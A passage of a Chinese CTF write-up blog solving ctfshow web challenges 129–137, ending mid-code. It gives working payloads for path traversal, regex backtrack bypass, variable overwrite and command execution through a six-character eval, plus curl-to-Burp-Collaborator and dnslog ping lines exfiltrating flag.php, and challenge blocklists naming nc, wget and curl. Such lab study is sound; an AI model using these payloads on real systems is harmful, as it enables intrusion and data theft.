拼接路径的真实路径是否合法，最终导致文件读取Web程序应该有很好的权限控制，为了避免使用者读取到服务器上未经许可的文件，通常会通过“根目录”这种机制加以限制。一般来讲，用户在网站进行浏览，所能见到的网页都是位于网站根目录下的文件。根目录以外的文件是不允许被未授权访问的。但是安全方面做得不严谨的web程序可能会出现目录穿越漏洞，恶意人员可以利用这个漏洞来读取根目录以外的文件夹。一旦成功，本不应该暴露的敏感信息就可能会被泄漏给恶意人员。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>常见造成目录穿越的函数：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">文件读取代码：file_get_contest<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">file_get_contest</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>fopen,fread<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$fp</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"unable open!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>readfile<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>目录穿越主要是通过<code>../</code>等造成访问非法路径造成的。</p><pre class="line-numbers language-none"><code class="language-none">payload:?f&#x3D;&#x2F;ctfshow&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php（测试少几个..&#x2F;都可以，具体后续学习记录）或者?f&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode|ctfshow&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-13 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-13 05:19:40*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/.+?ctfshow/is'</span><span class="token punctuation">,</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里考察了一次正则表达式</p><p><code>/.+?ctfshow/is</code>这里的<code>.</code>要求ctfshow之前必须有别的字符，所以f=ctfshow就可以直接绕过了正则表达。</p><pre class="line-numbers language-none"><code class="language-none">payload:f&#x3D;ctfshow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-13 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-13 05:19:40*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/.+?ctfshow/is'</span><span class="token punctuation">,</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'36Dctfshow'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bye!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在ctfshow前加了36D,此时需要用到正则表达式溢出来做</p><p><code>当要匹配的字符串长度大于100014的时候, 就不会得出正确结果</code></p><p>这是因为正则表达式回溯的问题，在PHP的pcre扩展中, 提供了俩个设置项.</p><pre class="line-numbers language-none"><code class="language-none">1. pcre.backtrack_limit &#x2F;&#x2F;最大回溯数2. pcre.recursion_limit &#x2F;&#x2F;最大嵌套数默认的backtarck_limit是100000(10万).如果回溯次数超过了这个值则preg_match会返回NULL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>具体可以参见<a href="https://www.laruence.com/2010/06/08/1579.html">博客</a></p><p>不是很懂wp给出的payload，用一个脚本解决</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://990f2696-ba59-4354-b875-3be043695f59.challenge.ctf.show:8080/"</span>data<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">"f"</span><span class="token punctuation">:</span><span class="token string">'very'</span><span class="token operator">*</span><span class="token number">250000</span><span class="token operator">+</span><span class="token string">'36Dctfshow'</span><span class="token punctuation">&#125;</span>resp<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/image-20210531131705457.png"></p><p>得到flag</p><h3 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h3><p>点开后发现是个界面，要访问robots.txt</p><p><img src="/images/image-20210531133551148.png"></p><p><img src="/images/image-20210531133606470.png"></p><p>访问url/admin/    就可以得到源码，<code>这里发现访问url/admin</code>，就不行，端口会没了，也不知道是为什么，访问后得到源码界面</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-13 06:22:13# @Last Modified by:   h1xa# @Last Modified time: 2020-10-13 20:05:36# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token comment">#error_reporting(0);</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$code</span> <span class="token operator">===</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x36D</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">===</span> <span class="token variable">$flag</span> <span class="token operator">||</span> <span class="token variable">$username</span> <span class="token operator">===</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$code</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里通过php表达式优先级解题，</p><pre class="line-numbers language-none"><code class="language-none">在php中&amp;&amp;的优先级 高于||，所以if、语句中的判断只需要满足username&#x3D;&quot;admin&quot;,就可以进入下一个if，让code&#x3D;“admin”就可以解出了payload:url&#x2F;admin&#x2F;?username&#x3D;admin&amp;code&#x3D;admin&amp;password&#x3D;aaa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date:   2020-10-13 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-13 16:43:44*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//flag.php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$F</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'F'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/system|nc|wget|exec|passthru|netcat/i'</span><span class="token punctuation">,</span> <span class="token variable">$F</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"6个字母都还不够呀?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>substr截取限制了6个字母，这里用到套娃的思路来扩展我们执行的空间</p><pre class="line-numbers language-none"><code class="language-none">先尝试：&#x2F;?F&#x3D;&#96;$F &#96;;sleep 3&#x2F;&#x2F;注意$F后有空格，这样到分号刚好6个字符这样传入的话可以得到eval(&#96;$F &#96;;)，而$F&#x3D;&#96;$F &#96;;sleep 3&#96;&#96;反引号是shell_exec()函数的缩写，以命令行形式执行命令这样会执行命令&#96;$F &#96;;也即shell_exec($F)&#x3D;&#x3D;&gt;shell_exec(&#96;$F &#96;;sleep 3)我们就可以成功执行sleep 3了，因为是在shell里执行了，所以前面的表达式不管了，我们通过分号后的表达式来执行想要的命令所以这是无回显的RCE题目无回显我们可以用反弹shell 或者curl外带 或者盲注这里的话反弹没有成功，但是可以外带。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过对<code>curl</code>的应用，利用curl去带出flag.php，使用burp中的Collaborator Client，获取flag。curl -F 将flag文件上传到Burp的 Collaborator Client<a href="https://blog.csdn.net/fageweiketang/article/details/89073662">Collaborator原理与使用</a></p><pre class="line-numbers language-none"><code class="language-none">curl 是常用的命令行工具，用来请求 Web 服务器，-F参数用来向服务器传输二进制文件，-X参数用来指定http代理<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="http://www.ruanyifeng.com/blog/2019/09/curl-reference.html">curl用法</a></p><p>简单来说就是通过curl让目标服务器向burp给出的服务器发送我们想要的东西，用burp来截获信息</p><p><img src="/images/image-20210531154407133.png"></p><h3 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h3><p>变量覆盖的一道题，因为有函数parse_str()和extract()</p><pre class="line-numbers language-none"><code class="language-none">extract — 从数组中将变量导入到当前的符号表parse_str — 将字符串解析成多个变量<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date:   2020-10-13 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-14 23:01:06*/</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$key1</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$key2</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nonononono"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key1</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'36d'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$key2</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'36d'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主要就是extract($_POST)可以做文章</p><p>$_SERVER[‘QUERY_STRING’]会记录url后面的问号后面的所有语句</p><pre class="line-numbers language-none"><code class="language-none">payload:url&#x2F;?_POST[key1]&#x3D;36d&amp;_POST[key2]&#x3D;36d传入后的过程：$_SERVER[&#39;QUERY_STRING&#39;]&#x3D;&quot;_POST[key1]&#x3D;36d&amp;_POST[key2]&#x3D;36d&quot;@parse_str($_SERVER[&#39;QUERY_STRING&#39;]);&#x3D;&#x3D;&gt;@parse_str(_POST[key1]&#x3D;36d&amp;_POST[key2]&#x3D;36d)执行后$_POST[key1]&#x3D;36d  $_POST[key2]&#x3D;36d此时再执行extract($_POST)$key1&#x3D;36d$key2&#x3D;36d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date:   2020-10-13 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-16 18:48:03*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//flag.php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$F</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'F'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i'</span><span class="token punctuation">,</span> <span class="token variable">$F</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"师傅们居然破解了前面的，那就来一个加强版吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>133加强版，过滤了curl，这就更能不会了，看wp看到了非预期解，把flag.php的内容通过命令复制给1.txt，直接访问就可以了</p><pre class="line-numbers language-none"><code class="language-none">payload:&#96;$F&#96;;+ping &#96;cat flag.php|awk &#39;NR&#x3D;&#x3D;2&#39;&#96;.6x1sys.dnslog.cn&#x2F;&#x2F;预期，后面再看吧?F&#x3D;&#96;$F &#96;;cp flag.php 1.txt&#x2F;&#x2F;非预期<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>试了一下发现非预期在133不能用，出题人说是因为出题的时候忘记了修改写入权限</p><h3 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\>|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i'</span><span class="token punctuation">,</span> <span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'too young too simple sometimes naive!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤了很多的命令和字符，我是真不知道还能用什么，wp说用tee命令</p><pre class="line-numbers language-none"><code class="language-none">Linux tee命令用于读取标准输入的数据，并将其内容输出成文件用法:tee file1 file2 &#x2F;&#x2F;复制文件ls|tee 1.txt &#x2F;&#x2F;命令输出到1.txt文件中<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>先url/?c=ls /|tee a</p><p>将ls输入到a中，访问url/a，会让下载文件，下载，后得到</p><p><img src="/images/image-20210531173017907.png"></p><p>再用同样的方法cat访问f149_15_h3r3即可</p><pre class="line-numbers language-none"><code class="language-none">url&#x2F;?c&#x3D;cat &#x2F;f149_15_h3r3| tee b<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问b，下载打开即得到flag</p><p><img src="/images/image-20210531173356069.png"></p><h3 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-13 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-16 22:27:49*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token 